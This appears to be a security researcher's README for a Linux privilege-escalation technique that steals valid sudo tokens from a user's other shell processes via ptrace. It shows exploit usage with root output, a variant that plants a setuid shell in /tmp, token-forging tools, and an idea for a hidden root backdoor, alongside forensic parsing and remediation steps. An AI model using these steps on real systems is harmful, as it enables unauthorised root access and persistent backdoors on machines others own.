# [Linux] Privilege Escalation by injecting process possessing sudo tokens

#### Inject process that have valid sudo token and activate our own sudo token

## Introduction

We all noticed that sometimes sudo doesn't ask us for a password because he remembers us. How does he remember us and how does he identifies us? Can we falsify our identity and become *root*?
As far as I know this research is not yet documented, but let me know if it is.
Indeed sudo creates a file for each linux user in /var/run/sudo/ts/[username].
These files contain both successful and failed authentications, then sudo uses these files to remember all the authenticated processes. -- [@chaignc][]

This repository provides you:
* A way to gain root privilege by abusing sudo tokens (Don't be too happy there are requirements).
* A tool to forge sudo tokens for a given process (write_sudo_token in ./extra_tools/).
* A tool to parse sudo tokens for forensic (read_sudo_token_forensic and read_sudo_token in ./extra_tools).
* A technique to transform any root arbitrary file write into stable root code execution.
* A  clue to make a exploit that does not require ptrace or that the targeted process is alive. 


## How to exploit a vulnerable system
PS: read requirements!!
```sh
$ sudo whatever
[sudo] password for user:    # Press <ctrl>+c since you don't have the password. # This creates an invalid sudo tokens.
$ sh exploit.sh
.... wait 1 seconds
$ sudo -i # no password required :)
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Requirements
* Ptrace fully enabled (/proc/sys/kernel/yama/ptrace_scope == 0).
* Current user must have living process that has a valid sudo token with the same uid.

```
The default password timeout is 15 minutes. So if you use sudo twice in 15 minutes (900 seconds), you will not be asked to type the user’s password again.
```
## Warning

* Educational purpose only, do not use on a system that you do not own.
* It's not well tested, so don't consider it as stable.

## What's happenning behind the scene?

exploit.sh injects all shell processes owned by the current user and use their sudo token to validate our own sudo token. It's barely 3 lines of shell, have a look.

## Usecase

This is far from a generic privesc without requirements but it works, for instance if you have a RCE and don't have the user password but the victim uses sudo then you can easily get root by stealing his token.

## How to simulate in lab?

```sh
# echo 0 > /proc/sys/kernel/yama/ptrace_scope
# # Don't worry this is not persistent accross reboot
```
Start two terminals:
* one to type sudo and enter the right password (example: sudo ls).
* another to start the exploit as described above.

## Going further

### exploit v2 creates a suid sh in /tmp/sh

For those with less luck with exploit v1 try the v2

```sh
$ ./exploit_v2.sh
Current process : 2441
chmod: changing permissions of 'activate_sudo_token': Operation not permitted
Injecting process 1721 -> bash
Injecting process 2433 -> bash
cat: /proc/2446/comm: No such file or directory
Injecting process 2446 -> 
$ /tmp/sh -p
# id
uid=1001(test) gid=1001(test) euid=0(root) egid=0(root) groups=0(root),1001(test)
```

### Forensic, DFIR?

Printing to be improved but each process sudo attempt has one entry in /var/run/sudo/ts/[username].
Also these files are stored in tmpfs(ram), one could write a volatility plugin to parse this information to gather sudo attempt.
```sh
./read_sudo_token_forensic  < /var/run/sudo/ts/user
version, flags, uid, sid, starttime_sec, starttime_nsec
2, 0, 0, 0, 0, 0
2, 0, 1001, 1145, 188, 660000000
2, 0, 1001, 24878, 7461, 490000000
2, 0, 1001, 24578, 6974, 10000000
```

### Arbitrary write to root

If you have an abitrary write you can create a sudo token for your current process to gain root code execution.
checkout './write_sudo_token $$ > /var/run/sudo/ts/[username]' in extra_tools.

### Silver sudo tickets

A very good way to create a secret root backdoor on servers that rarely reboots.
Not done yet but checkout './write_sudo_token $$' in ./extra_tools

### Why

I was looking for a way to steal dead process sudo token, but it doesn't look possible because they are associated by ((process start time *and* process session id) *or* (tty start time *and* tty session id)). Session id (process pid) can be impersonated but the process start time is not fakable.

### How to remediate?

* Update your sudo version
* Reduce ptrace power, example edit /etc/sysctl.conf with
```
kernel.yama.ptrace_scope = 1
```
[yama ptrace scope](https://linux-audit.com/protect-ptrace-processes-kernel-yama-ptrace_scope/)

## Links

[Parsing /proc/[pid]/stat](https://www.redhat.com/archives/axp-list/2001-January/msg00355.html)

[Sudo token struct](https://www.sudo.ws/man/1.8.25/sudoers_timestamp.man.html)

[Linux based inter process code injection without ptrace](https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html)

[Moving a process to another terminal](https://blog.habets.se/2009/03/Moving-a-process-to-another-terminal.html)

https://www.linusakesson.net/programming/tty/

----
By [@chaignc][] [#HexpressoTeam][hexpresso].


[hexpresso]:     https://hexpresso.github.io
[@chaignc]:    https://twitter.com/chaignc
